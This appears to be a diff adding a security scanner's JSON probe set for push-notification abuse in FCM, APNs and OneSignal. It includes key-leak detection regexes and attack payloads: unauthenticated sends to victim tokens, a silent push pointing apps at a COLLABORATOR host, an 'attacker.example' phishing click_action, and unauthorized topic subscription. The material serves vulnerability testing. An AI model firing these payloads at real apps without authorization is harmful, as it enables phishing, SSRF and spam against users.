@@ -1,0 +1,130 @@
+{
+  "category": "push_notification",
+  "description": "Push notification abuse — Firebase Cloud Messaging (FCM), Apple Push Notification Service (APNs), web push (VAPID), and OneSignal. Common bugs: unauthenticated server-key send, push-token enumeration, silent-push exfil to mobile apps that handle silent payloads in background, cross-account token reuse on shared devices.",
+  "craft_guidance": [
+    "1. FINGERPRINT: FCM endpoint = `fcm.googleapis.com/fcm/send` or `fcm.googleapis.com/v1/projects/<id>/messages:send`. APNs = `api.push.apple.com`. OneSignal = `onesignal.com/api/v1/notifications`.",
+    "2. SERVER KEY LEAK: legacy FCM uses long-lived `Authorization: key=AAAA...` server key. Often hardcoded in mobile app or web bundle. Search JS bundles for `AAAA[A-Za-z0-9_-]{120,}`.",
+    "3. UNAUTH SEND: if backend exposes a /push/send endpoint that proxies to FCM without authenticating the caller, attacker sends arbitrary push to any registered token.",
+    "4. TOKEN ENUM: FCM tokens are 142+ chars but begin with predictable prefix patterns. Brute-forcing whole space is infeasible; harvesting via XSS/log leak/partner-API is common.",
+    "5. SILENT PUSH: `data` (no `notification`) does NOT show UI but wakes app. Mobile app may execute arbitrary handler logic. If handler reflects payload data into JS bridge, RCE-class on mobile.",
+    "6. CROSS-ACCOUNT TOKEN: same physical device, two user logins = same FCM token. Server that pushes by token (not by user-id mapping) sends victim's payload to attacker.",
+    "7. NOTIFICATION CONTENT INJECTION: notification.body / title rendered as text — but if app passes through Markdown/HTML, XSS-on-notification possible.",
+    "8. DEEP LINK INJECTION: notification click_action / data.url often opens an in-app webview with attacker URL — phishing on the trusted app surface.",
+    "9. PERSISTENCE: subscribe attacker to your notifications via shared FCM topic (`/topics/<name>`); if topic creation is unauthenticated, anyone can subscribe.",
+    "10. COLLABORATOR: silent push with `data: { exfil_url: 'COLLABORATOR' }` — if app handler fetches from `data.exfil_url`, OOB confirmation."
+  ],
+  "contexts": {
+    "fcm_server_key_in_bundle": {
+      "description": "FCM legacy server key embedded in client (web/mobile) bundle. Server key has full project send privilege.",
+      "tech_match": ["firebase", "fcm"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Search JS / mobile bundle for FCM server key pattern (AAAA prefix, 152 chars). Hit = full project compromise.",
+          "matchers": [
+            {"type": "regex", "pattern": "AAAA[A-Za-z0-9_-]{140,}"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "Search for `firebase-messaging-server-key` or `FIREBASE_SERVER_KEY` env-style references.",
+          "matchers": [
+            {"type": "regex", "pattern": "(?i)firebase[_-]?(server[_-]?)?key|FIREBASE_SERVER_KEY"}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "fcm_unauth_send_proxy": {
+      "description": "Backend exposes `/api/push/send` or `/notifications/send` that proxies to FCM without authenticating the caller (or with caller-supplied target token).",
+      "tech_match": ["fcm", "push"],
+      "param_match": ["token", "to", "registration_id", "device_token"],
+      "probes": [
+        {
+          "payload": "{\"to\":\"<known_token>\",\"notification\":{\"title\":\"swk_test\",\"body\":\"swk\"}}",
+          "description": "Send notification through backend proxy with attacker-supplied token. If 200 + the test push delivers, no caller auth.",
+          "matchers": [
+            {"type": "status", "status": [200, 201]},
+            {"type": "word", "any": ["message_id", "success", "sent"]},
+            {"type": "not_word", "words": ["unauthorized", "forbidden"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "silent_push_exfil": {
+      "description": "Data-only push wakes mobile app handler in background. If handler trusts payload (e.g. fetches `data.url`), attacker has RCE-class primitive.",
+      "tech_match": ["fcm", "apns", "mobile"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"to\":\"<victim_token>\",\"data\":{\"action\":\"fetch\",\"url\":\"https://COLLABORATOR/\"},\"content_available\":true,\"priority\":\"high\"}",
+          "description": "Silent push with attacker-controlled URL in data. If victim app makes a fetch to COLLABORATOR, payload-driven SSRF on mobile confirmed.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "any": ["message_id", "sent"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60,
+          "variables": {"COLLAB_REQUIRED": true, "manual_chain": true}
+        }
+      ]
+    },
+    "topic_subscribe_unauth": {
+      "description": "FCM topics let any token subscribe. If app uses topic for sensitive notifications without server-side validation of subscriber identity, attacker subscribes and receives all topic broadcasts.",
+      "tech_match": ["fcm", "topic"],
+      "param_match": ["topic", "subscription"],
+      "probes": [
+        {
+          "payload": "{\"topic\":\"premium_users\",\"token\":\"<attacker_token>\"}",
+          "description": "Subscribe attacker token to high-value topic. If 200 and subsequent topic broadcasts reach attacker, isolation broken.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "not_word", "words": ["forbidden", "unauthorized"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "notification_deep_link_injection": {
+      "description": "Push payloads carry click_action / data.url that an in-app webview opens. Server-side trust of caller-supplied URL = phishing on the app's trusted surface.",
+      "tech_match": ["push", "mobile"],
+      "param_match": ["click_action", "deeplink", "url", "open_url"],
+      "probes": [
+        {
+          "payload": "{\"to\":\"<victim_token>\",\"notification\":{\"click_action\":\"https://attacker.example/phish\"}}",
+          "description": "Notification with attacker click_action. Victim taps -> in-app webview loads attacker URL with the user's session cookies.",
+          "matchers": [
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {"manual_chain": true}
+        }
+      ]
+    },
+    "cross_account_token_reuse": {
+      "description": "Same physical device + two user logins = same FCM token (Firebase doesn't bind tokens to user). Backend that maps user_id->token without re-checking on send may push victim's notifications to attacker (after attacker logged in on shared device).",
+      "tech_match": ["fcm", "mobile"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "[Manual] Verify by registering token under attacker account, then trigger event for victim account on the same backend. If notification delivers to attacker, mapping is wrong.",
+          "matchers": [
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {"manual_chain": true}
+        }
+      ]
+    }
+  }
+}
